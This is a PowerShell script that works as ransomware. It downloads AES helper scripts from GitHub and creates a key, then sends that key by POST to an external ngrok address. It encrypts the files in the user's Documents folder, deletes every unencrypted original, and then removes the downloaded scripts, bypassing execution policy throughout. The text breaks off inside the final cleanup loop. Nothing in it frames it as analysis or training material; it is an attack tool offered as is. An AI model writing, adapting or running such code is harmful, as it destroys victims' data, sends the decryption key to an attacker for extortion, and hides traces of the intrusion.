##Dowload and create AESKey & Post to Webserver
###############################################
$DownloadFolder = "$env:USERPROFILE\Downloads"

Invoke-RestMethod -Uri https://raw.githubusercontent.com/jmlntw/powershell-aes/master/Scripts/New-AesKey.ps1 -OutFile $env:USERPROFILE\Downloads\New-AesKey.ps1

$key = powershell -executionpolicy ByPass -File $env:USERPROFILE\Downloads\New-AesKey.ps1 | Select-String "Key"
$key = $key -Replace("Key","") -Replace(" ","")

$url = "http://419e-52-22-69-233.ngrok.io"
Invoke-WebRequest -Uri $url -Method POST -Headers @{"ngrok-skip-browser-warning"="Ignore"} -Body $key

##Download Encrypt Script
#########################
Invoke-RestMethod -Uri https://raw.githubusercontent.com/jmlntw/powershell-aes/master/Scripts/Protect-AesFile.ps1 -OutFile $DownloadFolder\Encrypt-AesKey.ps1


##Define folder to encrypt and loop through it to encrypt with created AES Key
##############################################################################

$TargetFolder = "$env:USERPROFILE\Documents"
foreach($file in Get-ChildItem $TargetFolder)

{
$output = $file.FullName + '.enc'
powershell -executionpolicy ByPass -File .\Encrypt-AesKey.ps1 -InFile $file.FullName -OutFile $output -Password $key

}

##Delete all none encrypted files
#################################

foreach($file in Get-ChildItem $TargetFolder -Recurse -Exclude *.enc*)

{

Remove-Item $file.FullName

}

##Delete downloaded scripts
###########################

foreach($file in Get-ChildItem $DownloadFolder -Recurse -filter *.ps1*)

{

Remove-Item $file.FullName
